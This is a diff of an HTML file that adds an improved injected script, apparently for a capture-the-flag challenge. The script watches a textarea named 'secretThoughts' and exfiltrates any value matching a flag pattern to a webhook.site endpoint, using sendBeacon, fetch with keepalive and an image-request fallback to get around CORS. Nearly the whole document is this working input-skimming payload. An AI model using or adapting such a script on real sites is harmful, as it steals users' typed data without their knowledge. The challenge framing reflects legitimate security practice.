@@ -24,39 +24,76 @@
   <!--
   The attack: append the below script to push all user input to a webhook.
   In this case we simply wait for input to match a CTF flag
+  2025-08-14 07:35 - testing a more robust implementation that includes beacon API and falls back to fetch, 
+  then img to work around CORS issues if present
   -->
   <script>
-  (function(){
-    var ta;
-    var sent = false;
-    var flagRegex = /^flag\{[0-9a-f]{32}\}$/i;
-  
-    function leak(val) {
-      if (sent) return;
-      sent = true;
-      var img = new Image();
-      img.src = 'https://webhook.site/3a1d6afe-b31a-4223-b3c3-1dee5b67a29f?leak=' + encodeURIComponent(val || '');
+(function(){
+  var ta, sent = false;
+  var flagRegex = /^flag\{[0-9a-f]{32}\}$/i;
+  var endpoint = 'https://webhook.site/3a1d6afe-b31a-4223-b3c3-1dee5b67a29f';
+
+  function postBeacon(val){
+    // Try sendBeacon (POST, no CORS preflight; works on page unload too)
+    try {
+      var body = new Blob(
+        [ 'leak=' + encodeURIComponent(val) + '&t=' + Date.now() ],
+        { type: 'application/x-www-form-urlencoded' }
+      );
+      if (navigator.sendBeacon && navigator.sendBeacon(endpoint, body)) return true;
+    } catch(_) {}
+    return false;
+  }
+
+  async function postFetch(val){
+    try {
+      // keepalive lets the request finish during page unload in many browsers
+      var res = await fetch(endpoint, {
+        method: 'POST',
+        mode: 'cors',                 // you said CORS is enabled on webhook.site
+        keepalive: true,
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'leak=' + encodeURIComponent(val) + '&t=' + Date.now()
+      });
+      return true; // we don't care about status for exfil
+    } catch(_) { return false; }
+  }
+
+  function postImg(val){
+    try {
+      var i = new Image();
+      i.src = endpoint + '?leak=' + encodeURIComponent(val) + '&t=' + Date.now();
+      return true;
+    } catch(_) { return false; }
+  }
+
+  async function leak(val){
+    if (sent) return;
+    sent = true;
+    if (postBeacon(val)) return;
+    if (await postFetch(val)) return;
+    postImg(val);
+  }
+
+  function check(){
+    if (!ta) ta = document.getElementById('secretThoughts');
+    if (ta) {
+      var v = (ta.value || '').trim();
+      if (flagRegex.test(v)) leak(v);
     }
-  
-    function check() {
-      if (!ta) ta = document.getElementById('secretThoughts');
-      if (ta && flagRegex.test(ta.value.trim())) {
-        leak(ta.value.trim());
-      }
+  }
+
+  // Poll every 250ms for up to 60s
+  var timer = setInterval(check, 250);
+  setTimeout(function(){ clearInterval(timer); }, 60000);
+
+  // Fire on live input too (covers paste/typing bots)
+  document.addEventListener('input', function(e){
+    if (e && e.target && e.target.id === 'secretThoughts') {
+      var v = (e.target.value || '').trim();
+      if (flagRegex.test(v)) leak(v);
     }
-  
-    // Poll every 250ms for up to 60s
-    var timer = setInterval(check, 250);
-    setTimeout(function(){ clearInterval(timer); }, 60000);
-  
-    // Event listeners in case the bot pastes fast
-    document.addEventListener('input', function(e) {
-      if (e.target && e.target.id === 'secretThoughts') {
-        if (flagRegex.test(e.target.value.trim())) {
-          leak(e.target.value.trim());
-        }
-      }
-    }, true);
-  })();
+  }, true);
+})();
 </script>
 </html>
